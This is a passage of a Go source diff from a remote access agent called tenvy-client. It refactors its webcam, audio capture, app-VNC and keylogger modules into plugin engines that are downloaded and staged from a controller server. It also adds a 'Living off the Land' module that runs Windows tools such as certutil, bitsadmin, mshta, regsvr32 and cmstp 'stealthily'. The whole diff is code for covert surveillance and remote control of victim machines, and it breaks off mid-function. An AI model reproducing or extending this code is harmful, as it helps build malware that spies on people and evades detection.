@@ -12,21 +12,22 @@ import (
 	"sync"
 	"time"
 
-	appvnc "github.com/rootbay/tenvy-client/internal/modules/control/appvnc"
-	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
-	keyloggerctrl "github.com/rootbay/tenvy-client/internal/modules/control/keylogger"
+	appvncengine "github.com/rootbay/tenvy-client/internal/plugins/engines/appvnc"
+	audioengine "github.com/rootbay/tenvy-client/internal/plugins/engines/audio"
+	keyloggerengine "github.com/rootbay/tenvy-client/internal/plugins/engines/keylogger"
 	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
-	webcamctrl "github.com/rootbay/tenvy-client/internal/modules/control/webcam"
+	webcamengine "github.com/rootbay/tenvy-client/internal/plugins/engines/webcam"
 	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
 	environmentmgr "github.com/rootbay/tenvy-client/internal/modules/management/environment"
-	filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
-	registrymgr "github.com/rootbay/tenvy-client/internal/modules/management/registry"
-	startupmgr "github.com/rootbay/tenvy-client/internal/modules/management/startup"
-	taskmanager "github.com/rootbay/tenvy-client/internal/modules/management/taskmanager"
-	tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
+	filemanagerengine "github.com/rootbay/tenvy-client/internal/plugins/engines/filemanager"
+	lotl "github.com/rootbay/tenvy-client/internal/modules/management/lotl"
+	registryengine "github.com/rootbay/tenvy-client/internal/plugins/engines/registry"
+	startupengine "github.com/rootbay/tenvy-client/internal/plugins/engines/startup"
+	taskmanagerengine "github.com/rootbay/tenvy-client/internal/plugins/engines/taskmanager"
+	tcpconnectionsengine "github.com/rootbay/tenvy-client/internal/plugins/engines/tcpconnections"
 	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
 	geolocationmgr "github.com/rootbay/tenvy-client/internal/modules/misc/geolocation"
-	triggermgr "github.com/rootbay/tenvy-client/internal/modules/misc/trigger"
+	triggerengine "github.com/rootbay/tenvy-client/internal/plugins/engines/trigger"
 	notes "github.com/rootbay/tenvy-client/internal/modules/notes"
 	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
 	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
@@ -35,8 +36,14 @@ import (
 	manifest "github.com/rootbay/tenvy-client/shared/pluginmanifest"
 )
 
+type appVncEngineFactory func(context.Context, Config, appvncengine.Config) (appvncengine.Engine, string, error)
+
 type appVncModule struct {
-	controller *appvnc.Controller
+	mu              sync.Mutex
+	engine          appvncengine.Engine
+	engineConfig    appvncengine.Config
+	factory         appVncEngineFactory
+	requiredVersion string
 }
 
 func (m *appVncModule) Metadata() ModuleMetadata {
@@ -59,65 +66,164 @@ func (m *appVncModule) ID() string {
 	return "app-vnc"
 }
 
-func (m *appVncModule) ensureController() *appvnc.Controller {
-	if m.controller == nil {
-		m.controller = appvnc.NewController()
+func (m *appVncModule) Init(ctx context.Context, cfg Config) error {
+	return m.configure(ctx, cfg)
+}
+
+func (m *appVncModule) UpdateConfig(cfg Config) error {
+	return m.configure(context.Background(), cfg)
+}
+
+func (m *appVncModule) configure(ctx context.Context, runtime Config) error {
+	var requestTimeout time.Duration
+	if runtime.HTTPClient != nil {
+		requestTimeout = runtime.HTTPClient.Timeout
 	}
-	return m.controller
-}
-
-func (m *appVncModule) Init(_ context.Context, cfg Config) error {
-	return m.configure(cfg)
-}
-
-func (m *appVncModule) configure(cfg Config) error {
-	controller := m.ensureController()
 	root := filepath.Join(os.TempDir(), "tenvy-appvnc")
 	if err := os.MkdirAll(root, 0o755); err != nil {
 		return fmt.Errorf("prepare app-vnc workspace root: %w", err)
 	}
-	controller.Update(appvnc.Config{
-		Logger:        cfg.Logger,
-		WorkspaceRoot: root,
-		AgentID:       cfg.AgentID,
-		BaseURL:       cfg.BaseURL,
-		AuthKey:       cfg.AuthKey,
-		Client:        cfg.HTTPClient,
-		UserAgent:     cfg.UserAgent,
-	})
-	return nil
-}
 
-func (m *appVncModule) UpdateConfig(cfg Config) error {
-	return m.configure(cfg)
+	cfg := appvncengine.Config{
+		Logger:         runtime.Logger,
+		WorkspaceRoot:  root,
+		AgentID:        runtime.AgentID,
+		BaseURL:        runtime.BaseURL,
+		AuthKey:        runtime.AuthKey,
+		Client:         runtime.HTTPClient,
+		UserAgent:      runtime.UserAgent,
+		RequestTimeout: requestTimeout,
+	}
+
+	m.mu.Lock()
+	factory := m.factory
+	engine := m.engine
+	version := strings.TrimSpace(m.requiredVersion)
+	m.mu.Unlock()
+
+	if engine == nil {
+		if factory == nil {
+			factory = defaultAppVncEngineFactory
+		}
+		created, stagedVersion, err := factory(ctx, runtime, cfg)
+		if err != nil {
+			return err
+		}
+		stagedVersion = strings.TrimSpace(stagedVersion)
+		if stagedVersion != "" {
+			cfg.RequestTimeout = requestTimeout
+		}
+		if err := created.Configure(cfg); err != nil {
+			return err
+		}
+		m.mu.Lock()
+		m.engine = created
+		m.engineConfig = cfg
+		if stagedVersion != "" {
+			m.requiredVersion = stagedVersion
+		}
+		m.mu.Unlock()
+		return nil
+	}
+
+	if err := engine.Configure(cfg); err != nil {
+		return err
+	}
+	m.mu.Lock()
+	m.engineConfig = cfg
+	m.mu.Unlock()
+	return nil
 }
 
 func (m *appVncModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	controller := m.ensureController()
-	if controller == nil {
+	engine := m.currentEngine()
+	if engine == nil {
 		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
-			Error:       "app-vnc controller unavailable",
+			Error:       "app-vnc subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
 	}
-	return WrapCommandResult(controller.HandleCommand(ctx, cmd))
+	return WrapCommandResult(engine.HandleCommand(ctx, cmd))
 }
 
 func (m *appVncModule) HandleInputBurst(ctx context.Context, burst protocol.AppVncInputBurst) error {
-	controller := m.ensureController()
-	if controller == nil {
-		return fmt.Errorf("app-vnc controller unavailable")
+	engine := m.currentEngine()
+	if engine == nil {
+		return fmt.Errorf("app-vnc subsystem not initialized")
 	}
-	return controller.HandleInputBurst(ctx, burst)
+	return engine.HandleInputBurst(ctx, burst)
 }
 
 func (m *appVncModule) Shutdown(ctx context.Context) error {
-	if m.controller != nil {
-		m.controller.Shutdown(ctx)
+	engine := m.currentEngine()
+	if engine != nil {
+		engine.Shutdown(ctx)
 	}
 	return nil
+}
+
+func (m *appVncModule) currentEngine() appvncengine.Engine {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	return m.engine
+}
+
+func defaultAppVncEngineFactory(ctx context.Context, runtime Config, cfg appvncengine.Config) (appvncengine.Engine, string, error) {
+	manager := runtime.Plugins
+	client := runtime.HTTPClient
+	baseURL := strings.TrimSpace(runtime.BaseURL)
+	agentID := strings.TrimSpace(runtime.AgentID)
+
+	fallback := func() (appvncengine.Engine, string, error) {
+		engine := appvncengine.NewAppVncEngine(cfg)
+		return engine, "", nil
+	}
+
+	if manager == nil || client == nil || baseURL == "" || agentID == "" {
+		return fallback()
+	}
+
+	descriptor, ok := runtime.PluginManifests["appvnc-engine"]
+	if !ok {
+		return fallback()
+	}
+
+	stageCtx := ctx
+	if stageCtx == nil {
+		stageCtx = context.Background()
+	}
+
+	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
+	defer cancel()
+
+	var metadata protocol.AgentMetadata
+	if runtime.Provider != nil {
+		metadata = runtime.Provider.AgentMetadata()
+	}
+	agentVersion := strings.TrimSpace(runtime.BuildVersion)
+	if agentVersion == "" {
+		agentVersion = strings.TrimSpace(metadata.Version)
+	}
+	facts := manifest.RuntimeFacts{
+		Platform:       metadata.OS,
+		Architecture:   metadata.Architecture,
+		AgentVersion:   agentVersion,
+		EnabledModules: append([]string(nil), runtime.ActiveModules...),
+	}
+
+	result, err := plugins.StagePlugin(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent, facts, descriptor, "appvnc-engine")
+	if err != nil {
+		if runtime.Logger != nil {
+			runtime.Logger.Printf("app-vnc: engine staging failed: %v", err)
+		}
+		return fallback()
+	}
+
+	version := strings.TrimSpace(result.Manifest.Version)
+	engine := appvncengine.NewManagedAppVncEngine(result.EntryPath, version, runtime.Logger)
+	return engine, version, nil
 }
 
 type remoteDesktopEngineFactory func(context.Context, Config, remotedesktop.Config) (remotedesktop.Engine, string, error)
@@ -521,6 +627,7 @@ func defaultRemoteDesktopEngineFactory(ctx context.Context, runtime Config, cfg 
 }
 
 var (
+	lotlModuleBaseCapabilities            = []string{"lotl.certutil", "lotl.bitsadmin", "lotl.wevtutil", "lotl.netsh", "lotl.sc", "lotl.taskkill", "lotl.powershell", "lotl.mshta", "lotl.rundll32", "lotl.regsvr32", "lotl.wmic", "lotl.whoami", "lotl.net", "lotl.msiexec", "lotl.cmstp"}
 	audioModuleBaseCapabilities          = []string{"audio.capture", "audio.inject"}
 	keyloggerModuleBaseCapabilities      = []string{"keylogger.stream", "keylogger.batch"}
 	webcamModuleBaseCapabilities         = []string{"webcam.enumerate", "webcam.stream"}
@@ -535,6 +642,12 @@ var (
 	geoModuleBaseCapabilities            = []string{"ip-geolocation.lookup", "ip-geolocation.providers"}
 )
 
+func newLotlModule() *lotlModule {
+	return &lotlModule{
+		BaseModule: *NewBaseModule("lotl", lotlModuleBaseCapabilities),
+	}
+}
+
 func newClipboardModule() *clipboardModule           { return &clipboardModule{} }
 func newFileManagerModule() *fileManagerModule       { return &fileManagerModule{} }
 func newTaskManagerModule() *taskManagerModule       { return &taskManagerModule{} }
@@ -542,19 +655,220 @@ func newTCPConnectionsModule() *tcpConnectionsModule { return &tcpConnectionsMod
 func newClientChatModule() *clientChatModule         { return &clientChatModule{} }
 func newSystemInfoModule() *systemInfoModule         { return &systemInfoModule{} }
 
+type lotlModule struct {
+	BaseModule
+	manager *lotl.LotlManager
+}
+
+func (m *lotlModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "lotl",
+		Title:       "Living off the Land",
+		Description: "Execute native system tools to perform common operations stealthily.",
+		Commands:    []string{"lotl"},
+		Capabilities: []ModuleCapability{
+			{
+				ID:          "lotl.certutil",
+				Name:        "certutil",
+				Description: "Use certutil.exe for file encoding and decoding.",
+			},
+			{
+				ID:          "lotl.bitsadmin",
+				Name:        "bitsadmin",
+				Description: "Use bitsadmin.exe for file transfers.",
+			},
+			{
+				ID:          "lotl.wevtutil",
+				Name:        "wevtutil",
+				Description: "Use wevtutil.exe for event log management.",
+			},
+			{
+				ID:          "lotl.netsh",
+				Name:        "netsh",
+				Description: "Use netsh.exe for network configuration and port forwarding.",
+			},
+			{
+				ID:          "lotl.sc",
+				Name:        "sc",
+				Description: "Use sc.exe for service control and enumeration.",
+			},
+			{
+				ID:          "lotl.taskkill",
+				Name:        "taskkill",
+				Description: "Use taskkill.exe for process termination.",
+			},
+			{
+				ID:          "lotl.powershell",
+				Name:        "powershell",
+				Description: "Use powershell.exe for advanced command execution.",
+			},
+			{
+				ID:          "lotl.mshta",
+				Name:        "mshta",
+				Description: "Use mshta.exe for script execution.",
+			},
+			{
+				ID:          "lotl.rundll32",
+				Name:        "rundll32",
+				Description: "Use rundll32.exe for DLL function execution.",
+			},
+			{
+				ID:          "lotl.regsvr32",
+				Name:        "regsvr32",
+				Description: "Use regsvr32.exe for DLL registration and proxy execution.",
+			},
+			{
+				ID:          "lotl.wmic",
+				Name:        "wmic",
+				Description: "Use wmic.exe for WMI queries and management.",
+			},
+			{
+				ID:          "lotl.whoami",
+				Name:        "whoami",
+				Description: "Use whoami.exe for user and group information.",
+			},
+			{
+				ID:          "lotl.net",
+				Name:        "net",
+				Description: "Use net.exe for network and user management.",
+			},
+			{
+				ID:          "lotl.msiexec",
+				Name:        "msiexec",
+				Description: "Use msiexec.exe for installer-based execution.",
+			},
+			{
+				ID:          "lotl.cmstp",
+				Name:        "cmstp",
+				Description: "Use cmstp.exe for INF-based execution.",
+			},
+		},
+	}
+}
+
+func (m *lotlModule) Init(ctx context.Context, cfg Config) error {
+	m.BaseModule.Init(ctx, cfg)
+	return m.configure(cfg)
+}
+
+func (m *lotlModule) UpdateConfig(cfg Config) error {
+	m.BaseModule.UpdateConfig(cfg)
+	return m.configure(cfg)
+}
+
+func (m *lotlModule) configure(runtime Config) error {
+	if m.manager == nil {
+		m.manager = lotl.NewManager(runtime.Logger)
+	}
+	return nil
+}
+
+func (m *lotlModule) Handle(ctx context.Context, cmd protocol.Command) error {
+	if m.manager == nil {
+		return WrapCommandResult(protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "lotl subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		})
+	}
+
+	var payload lotl.LotlCommandPayload
+	if err := protocol.UnmarshalPayload(cmd.Payload, &payload); err == nil {
+		action := strings.ToLower(strings.TrimSpace(payload.Action))
+		switch {
+		case strings.HasPrefix(action, "certutil"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.certutil"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "bitsadmin"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.bitsadmin"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "wevtutil"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.wevtutil"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "netsh"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.netsh"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "sc"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.sc"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "taskkill"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.taskkill"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "powershell"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.powershell"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "mshta"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.mshta"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "rundll32"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.rundll32"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "regsvr32"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.regsvr32"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "wmic"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.wmic"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "whoami"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.whoami"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "net"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.net"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "msiexec"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.msiexec"); err != nil {
+				return err
+			}
+		case strings.HasPrefix(action, "cmstp"):
+			if err := m.HandleCapabilityCheck(cmd, "lotl.cmstp"); err != nil {
+				return err
+			}
+		}
+	}
+
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+}
+
+type keyloggerEngineFactory func(context.Context, Config, keyloggerengine.Config) (keyloggerengine.Engine, string, error)
+
 type keyloggerModule struct {
 	BaseModule
-	manager *keyloggerctrl.Manager
+	mu              sync.Mutex
+	engine          keyloggerengine.Engine
+	engineConfig    keyloggerengine.Config
+	factory         keyloggerEngineFactory
+	requiredVersion string
 }
+
+type webcamEngineFactory func(context.Context, Config, webcamengine.Config) (webcamengine.Engine, string, error)
 
 type webcamModule struct {
 	BaseModule
-	manager *webcamctrl.Manager
+	mu              sync.Mutex
+	engine          webcamengine.Engine
+	engineConfig    webcamengine.Config
+	factory         webcamEngineFactory
+	requiredVersion string
 }
 
 func newWebcamModule() *webcamModule {
 	return &webcamModule{
 		BaseModule: *NewBaseModule("webcam-control", webcamModuleBaseCapabilities),
+		factory:    defaultWebcamEngineFactory,
 	}
 }
 
@@ -581,33 +895,72 @@ func (m *webcamModule) Metadata() ModuleMetadata {
 
 func (m *webcamModule) Init(ctx context.Context, cfg Config) error {
 	m.BaseModule.Init(ctx, cfg)
-	return m.configure(cfg)
+	return m.configure(ctx, cfg)
 }
 
 func (m *webcamModule) UpdateConfig(cfg Config) error {
 	m.BaseModule.UpdateConfig(cfg)
-	return m.configure(cfg)
+	return m.configure(context.Background(), cfg)
 }
 
-func (m *webcamModule) configure(runtime Config) error {
-	cfg := webcamctrl.Config{
-		AgentID:   runtime.AgentID,
-		BaseURL:   runtime.BaseURL,
-		AuthKey:   runtime.AuthKey,
-		Client:    runtime.HTTPClient,
-		Logger:    runtime.Logger,
-		UserAgent: runtime.UserAgent,
+func (m *webcamModule) configure(ctx context.Context, runtime Config) error {
+	var requestTimeout time.Duration
+	if runtime.HTTPClient != nil {
+		requestTimeout = runtime.HTTPClient.Timeout
 	}
-	if m.manager == nil {
-		m.manager = webcamctrl.NewManager(cfg)
+	cfg := webcamengine.Config{
+		AgentID:        runtime.AgentID,
+		BaseURL:        runtime.BaseURL,
+		AuthKey:        runtime.AuthKey,
+		Client:         runtime.HTTPClient,
+		Logger:         runtime.Logger,
+		UserAgent:      runtime.UserAgent,
+		RequestTimeout: requestTimeout,
+	}
+
+	m.mu.Lock()
+	factory := m.factory
+	engine := m.engine
+	version := strings.TrimSpace(m.requiredVersion)
+	m.mu.Unlock()
+
+	if engine == nil {
+		if factory == nil {
+			factory = defaultWebcamEngineFactory
+		}
+		created, stagedVersion, err := factory(ctx, runtime, cfg)
+		if err != nil {
+			return err
+		}
+		stagedVersion = strings.TrimSpace(stagedVersion)
+		if stagedVersion != "" {
+			cfg.RequestTimeout = requestTimeout // ensure it's set
+		}
+		if err := created.Configure(cfg); err != nil {
+			return err
+		}
+		m.mu.Lock()
+		m.engine = created
+		m.engineConfig = cfg
+		if stagedVersion != "" {
+			m.requiredVersion = stagedVersion
+		}
+		m.mu.Unlock()
 		return nil
 	}
-	m.manager.UpdateConfig(cfg)
+
+	if err := engine.Configure(cfg); err != nil {
+		return err
+	}
+	m.mu.Lock()
+	m.engineConfig = cfg
+	m.mu.Unlock()
 	return nil
 }
 
 func (m *webcamModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	if m.manager == nil {
+	engine := m.currentEngine()
+	if engine == nil {
 		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
@@ -615,6 +968,7 @@ func (m *webcamModule) Handle(ctx context.Context, cmd protocol.Command) error {
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
 	}
+
 	if len(cmd.Payload) > 0 {
 		var payload protocol.WebcamCommandPayload
 		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
@@ -631,21 +985,95 @@ func (m *webcamModule) Handle(ctx context.Context, cmd protocol.Command) error {
 			}
 		}
 	}
-	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+
+	return WrapCommandResult(engine.HandleCommand(ctx, cmd))
 }
 
 func (m *webcamModule) Shutdown(context.Context) error {
+	engine := m.currentEngine()
+	if engine != nil {
+		engine.Shutdown()
+	}
 	return nil
 }
 
+func (m *webcamModule) currentEngine() webcamengine.Engine {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	return m.engine
+}
+
+func defaultWebcamEngineFactory(ctx context.Context, runtime Config, cfg webcamengine.Config) (webcamengine.Engine, string, error) {
+	manager := runtime.Plugins
+	client := runtime.HTTPClient
+	baseURL := strings.TrimSpace(runtime.BaseURL)
+	agentID := strings.TrimSpace(runtime.AgentID)
+
+	fallback := func() (webcamengine.Engine, string, error) {
+		engine := webcamengine.NewWebcamEngine(cfg)
+		return engine, "", nil
+	}
+
+	if manager == nil || client == nil || baseURL == "" || agentID == "" {
+		return fallback()
+	}
+
+	descriptor, ok := runtime.PluginManifests["webcam-engine"]
+	if !ok {
+		return fallback()
+	}
+
+	stageCtx := ctx
+	if stageCtx == nil {
+		stageCtx = context.Background()
+	}
+
+	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
+	defer cancel()
+
+	var metadata protocol.AgentMetadata
+	if runtime.Provider != nil {
+		metadata = runtime.Provider.AgentMetadata()
+	}
+	agentVersion := strings.TrimSpace(runtime.BuildVersion)
+	if agentVersion == "" {
+		agentVersion = strings.TrimSpace(metadata.Version)
+	}
+	facts := manifest.RuntimeFacts{
+		Platform:       metadata.OS,
+		Architecture:   metadata.Architecture,
+		AgentVersion:   agentVersion,
+		EnabledModules: append([]string(nil), runtime.ActiveModules...),
+	}
+
+	result, err := plugins.StagePlugin(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent, facts, descriptor, "webcam-engine")
+	if err != nil {
+		if runtime.Logger != nil {
+			runtime.Logger.Printf("webcam: engine staging failed: %v", err)
+		}
+		return fallback()
+	}
+
+	version := strings.TrimSpace(result.Manifest.Version)
+	engine := webcamengine.NewManagedWebcamEngine(result.EntryPath, version, runtime.Logger)
+	return engine, version, nil
+}
+
+type audioEngineFactory func(context.Context, Config, audioengine.Config) (audioengine.Engine, string, error)
+
 type audioModule struct {
 	BaseModule
-	bridge *audioctrl.AudioBridge
+	mu              sync.Mutex
+	engine          audioengine.Engine
+	engineConfig    audioengine.Config
+	factory         audioEngineFactory
+	requiredVersion string
 }
 
 func newAudioModule() *audioModule {
 	return &audioModule{
 		BaseModule: *NewBaseModule("audio-control", audioModuleBaseCapabilities),
+		factory:    defaultAudioEngineFactory,
 	}
 }
 
@@ -680,33 +1108,72 @@ func (m *audioModule) Metadata() ModuleMetadata {
 
 func (m *audioModule) Init(ctx context.Context, cfg Config) error {
 	m.BaseModule.Init(ctx, cfg)
-	return m.configure(cfg)
+	return m.configure(ctx, cfg)
 }
 
 func (m *audioModule) UpdateConfig(cfg Config) error {
 	m.BaseModule.UpdateConfig(cfg)
-	return m.configure(cfg)
+	return m.configure(context.Background(), cfg)
 }
 
-func (m *audioModule) configure(runtime Config) error {
-	cfg := audioctrl.Config{
-		AgentID:   runtime.AgentID,
-		BaseURL:   runtime.BaseURL,
-		AuthKey:   runtime.AuthKey,
-		Client:    runtime.HTTPClient,
-		Logger:    runtime.Logger,
-		UserAgent: runtime.UserAgent,
+func (m *audioModule) configure(ctx context.Context, runtime Config) error {
+	var requestTimeout time.Duration
+	if runtime.HTTPClient != nil {
+		requestTimeout = runtime.HTTPClient.Timeout
 	}
-	if m.bridge == nil {
-		m.bridge = audioctrl.NewAudioBridge(cfg)
+	cfg := audioengine.Config{
+		AgentID:        runtime.AgentID,
+		BaseURL:        runtime.BaseURL,
+		AuthKey:        runtime.AuthKey,
+		Client:         runtime.HTTPClient,
+		Logger:         runtime.Logger,
+		UserAgent:      runtime.UserAgent,
+		RequestTimeout: requestTimeout,
+	}
+
+	m.mu.Lock()
+	factory := m.factory
+	engine := m.engine
+	version := strings.TrimSpace(m.requiredVersion)
+	m.mu.Unlock()
+
+	if engine == nil {
+		if factory == nil {
+			factory = defaultAudioEngineFactory
+		}
+		created, stagedVersion, err := factory(ctx, runtime, cfg)
+		if err != nil {
+			return err
+		}
+		stagedVersion = strings.TrimSpace(stagedVersion)
+		if stagedVersion != "" {
+			cfg.RequestTimeout = requestTimeout
+		}
+		if err := created.Configure(cfg); err != nil {
+			return err
+		}
+		m.mu.Lock()
+		m.engine = created
+		m.engineConfig = cfg
+		if stagedVersion != "" {
+			m.requiredVersion = stagedVersion
+		}
+		m.mu.Unlock()
 		return nil
 	}
-	m.bridge.UpdateConfig(cfg)
+
+	if err := engine.Configure(cfg); err != nil {
+		return err
+	}
+	m.mu.Lock()
+	m.engineConfig = cfg
+	m.mu.Unlock()
 	return nil
 }
 
 func (m *audioModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	if m.bridge == nil {
+	engine := m.currentEngine()
+	if engine == nil {
 		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
@@ -714,8 +1181,9 @@ func (m *audioModule) Handle(ctx context.Context, cmd protocol.Command) error {
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
 	}
+
 	if len(cmd.Payload) > 0 {
-		var payload audioctrl.AudioControlCommandPayload
+		var payload audioengine.AudioControlCommandPayload
 		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
 			action := strings.ToLower(strings.TrimSpace(payload.Action))
 			switch action {
@@ -726,10 +1194,10 @@ func (m *audioModule) Handle(ctx context.Context, cmd protocol.Command) error {
 			case "start":
 				direction := payload.Direction
 				if direction == "" {
-					direction = audioctrl.AudioDirectionInput
+					direction = audioengine.AudioDirectionInput
 				}
 				required := "audio.capture"
-				if direction == audioctrl.AudioDirectionOutput {
+				if direction == audioengine.AudioDirectionOutput {
 					required = "audio.inject"
 				}
 				if err := m.HandleCapabilityCheck(cmd, required); err != nil {
@@ -746,122 +1214,80 @@ func (m *audioModule) Handle(ctx context.Context, cmd protocol.Command) error {
 			}
 		}
 	}
-	return WrapCommandResult(m.bridge.HandleCommand(ctx, cmd))
+
+	return WrapCommandResult(engine.HandleCommand(ctx, cmd))
 }
 
 func (m *audioModule) Shutdown(context.Context) error {
-	if m.bridge != nil {
-		m.bridge.Shutdown()
+	engine := m.currentEngine()
+	if engine != nil {
+		engine.Shutdown()
 	}
 	return nil
 }
 
-func newKeyloggerModule() *keyloggerModule {
-	return &keyloggerModule{
-		BaseModule: *NewBaseModule("keylogger", keyloggerModuleBaseCapabilities),
-	}
+func (m *audioModule) currentEngine() audioengine.Engine {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	return m.engine
 }
 
-func (m *keyloggerModule) Metadata() ModuleMetadata {
-	return ModuleMetadata{
-		ID:          "keylogger",
-		Title:       "Keylogger",
-		Description: "Capture keystrokes and related telemetry from the remote host.",
-		Commands:    []string{"keylogger.start", "keylogger.stop"},
-		Capabilities: []ModuleCapability{
-			{
-				ID:          "keylogger.stream",
-				Name:        "keylogger.stream",
-				Description: "Stream keystroke telemetry to the controller in near real time.",
-			},
-			{
-				ID:          "keylogger.batch",
-				Name:        "keylogger.batch",
-				Description: "Batch keystrokes offline and upload on a schedule.",
-			},
-		},
-	}
-}
+func defaultAudioEngineFactory(ctx context.Context, runtime Config, cfg audioengine.Config) (audioengine.Engine, string, error) {
+	manager := runtime.Plugins
+	client := runtime.HTTPClient
+	baseURL := strings.TrimSpace(runtime.BaseURL)
+	agentID := strings.TrimSpace(runtime.AgentID)
 
-func (m *keyloggerModule) Init(ctx context.Context, cfg Config) error {
-	m.BaseModule.Init(ctx, cfg)
-	return m.configure(cfg)
-}
-
-func (m *keyloggerModule) UpdateConfig(cfg Config) error {
-	m.BaseModule.UpdateConfig(cfg)
-	return m.configure(cfg)
-}
-
-func (m *keyloggerModule) configure(runtime Config) error {
-	cfg := keyloggerctrl.Config{
-		AgentID:   runtime.AgentID,
-		BaseURL:   runtime.BaseURL,
-		AuthKey:   runtime.AuthKey,
-		Client:    runtime.HTTPClient,
-		Logger:    runtime.Logger,
-		UserAgent: runtime.UserAgent,
+	fallback := func() (audioengine.Engine, string, error) {
+		engine := audioengine.NewAudioEngine(cfg)
+		return engine, "", nil
 	}
-	if m.manager == nil {
-		m.manager = keyloggerctrl.NewManager(cfg)
-		return nil
-	}
-	m.manager.UpdateConfig(cfg)
-	return nil
-}
 
-func (m *keyloggerModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	if m.manager == nil {
-		return WrapCommandResult(protocol.CommandResult{
-			CommandID:   cmd.ID,
-			Success:     false,
-			Error:       "keylogger subsystem not initialized",
-			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		})
+	if manager == nil || client == nil || baseURL == "" || agentID == "" {
+		return fallback()
 	}
-	if len(cmd.Payload) > 0 {
-		var payload keyloggerctrl.CommandPayload
-		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
-			action := strings.TrimSpace(strings.ToLower(payload.Action))
-			if action == "" {
-				switch strings.ToLower(strings.TrimSpace(cmd.Name)) {
-				case "keylogger.start":
-					action = "start"
-				case "keylogger.stop":
-					action = "stop"
-				}
-			}
-			switch action {
-			case "start":
-				mode := payload.Mode
-				if payload.Config != nil && payload.Config.Mode != "" {
-					mode = payload.Config.Mode
-				}
-				if mode == keyloggerctrl.ModeOffline {
-					if err := m.HandleCapabilityCheck(cmd, "keylogger.batch"); err != nil {
-						return err
-					}
-				} else {
-					if err := m.HandleCapabilityCheck(cmd, "keylogger.stream"); err != nil {
-						return err
-					}
-				}
-			case "stop":
-				if err := m.HandleCapabilityCheck(cmd, "keylogger.stream", "keylogger.batch"); err != nil {
-					return err
-				}
-			}
+
+	descriptor, ok := runtime.PluginManifests["audio-engine"]
+	if !ok {
+		return fallback()
+	}
+
+	stageCtx := ctx
+	if stageCtx == nil {
+		stageCtx = context.Background()
+	}
+
+	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
+	defer cancel()
+
+	var metadata protocol.AgentMetadata
+	if runtime.Provider != nil {
+		metadata = runtime.Provider.AgentMetadata()
+	}
+	agentVersion := strings.TrimSpace(runtime.BuildVersion)
+	if agentVersion == "" {
+		agentVersion = strings.TrimSpace(metadata.Version)
+	}
+	facts := manifest.RuntimeFacts{
+		Platform:       metadata.OS,
+		Architecture:   metadata.Architecture,
+		AgentVersion:   agentVersion,
+		EnabledModules: append([]string(nil), runtime.ActiveModules...),
+	}
+
+	result, err := plugins.StagePlugin(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent, facts, descriptor, "audio-engine")
+	if err != nil {
+		if runtime.Logger != nil {
+			runtime.Logger.Printf("audio: engine staging failed: %v", err)
 		}
+		return fallback()
 	}
